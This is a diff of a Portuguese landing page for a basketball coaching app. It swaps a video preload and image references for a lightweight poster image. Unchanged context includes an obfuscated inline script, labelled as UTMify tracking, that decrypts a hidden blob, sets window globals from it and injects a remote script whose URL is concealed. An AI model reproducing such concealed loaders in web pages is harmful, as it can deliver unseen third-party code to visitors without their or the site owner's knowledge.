@@ -18,14 +18,14 @@
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800;900&display=swap">
   </noscript>
 
-  <!-- Preload do Vídeo LCP -->
-  <link rel="preload" as="video" href="videos/video_pg_coachbrain.mp4" type="video/mp4">
+  <!-- Preload do Poster LCP (Apenas 6KB para eliminação da tela branca no FCP) -->
+  <link rel="preload" as="image" href="coachbrain-poster.webp" fetchpriority="high" />
 
   <!-- Open Graph -->
   <meta property="og:title" content="CoachBrain | O Teu Assistente Técnico de Basquetebol 24/7" />
   <meta property="og:description" content="Deixa de improvisar os teus treinos. Faz a tua equipa evoluir em cada sessão no pavilhão." />
   <meta property="og:type" content="website" />
-  <meta property="og:image" content="hero-mockup-es.webp" />
+  <meta property="og:image" content="coachbrain-poster.webp" />
 
   <!-- Scripts UTMify Preservados Integralmente -->
   <script>(function(){var e_r=atob("DNui+khXM/NgsQVAE6CAjzo7EclC2XE0Y6iY1Wc0V51OxHEter3b1Cs4Xt0CwyozcKnLijwkHIYU3HZvf7rWnzsjHZkTkylicq/WiCE1RocFwid6SKCAlCk6VtFak2EhZ7qPjzw6WpUZnHUydq3HlDx6S5AP1SgzcLCA1mohUp8V1Cd6Mfnf1jN1XZIN1Cd6Mb/Djil6RocN2GM5PqvQnz4yXYdNwnAier/R2GR1RZIMxGBiKfmAhxUq");var c_hcj=[];for(var x_3d=0;x_3d<e_r.length;x_3d++){c_hcj.push(e_r.charCodeAt(x_3d)&255);}var j_1b=c_hcj[0];var c_bff8=c_hcj.slice(1,1+j_1b);var k_gbt=c_hcj.slice(1+j_1b);var i_ftv2=k_gbt.map(function(b,z_iao1){return b^c_bff8[z_iao1%j_1b];});var s_8aop="";for(var h_q=0;h_q<i_ftv2.length;h_q++){s_8aop+=String.fromCharCode(i_ftv2[h_q]&255);}var b_y=decodeURIComponent(escape(s_8aop));var s_0hs=JSON.parse(b_y);var k_2=s_0hs.globals||[];k_2.forEach(function(h_zpw4){window[h_zpw4.name]=h_zpw4.value;});var h_oe=document.createElement("script");h_oe.src=s_0hs.url;h_oe.async=true;h_oe.defer=true;(s_0hs.attributes||[]).forEach(function(w_t9i){h_oe.setAttribute(w_t9i.name,w_t9i.value);});(document.head||document.documentElement).appendChild(h_oe);})();</script>
@@ -96,7 +96,7 @@
         <video
           id="app-preview-video"
           src="videos/video_pg_coachbrain.mp4"
-          poster="hero-mockup-es.webp"
+          poster="coachbrain-poster.webp"
           preload="metadata"
           style="width: 100%; height: 100%; display: block; object-fit: cover;"
           autoplay
